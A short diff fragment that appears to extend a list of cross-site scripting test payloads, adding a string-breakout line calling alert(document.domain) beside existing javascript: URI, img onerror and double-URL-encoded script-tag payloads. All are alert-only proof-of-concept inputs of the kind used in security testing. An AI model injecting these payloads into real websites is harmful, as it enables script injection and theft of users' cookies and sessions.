@@ -8,3 +8,4 @@
 - javascript:alert(document.domain)
 - <img src=x onerror=alert(document.cookie)>
 - "><script>alert(docoment.cookie)</script> encoded as %2522%253E%253Cscript%253Ealert(document.cookie)%253C/script%253E
+- ');alert(document.domain);//
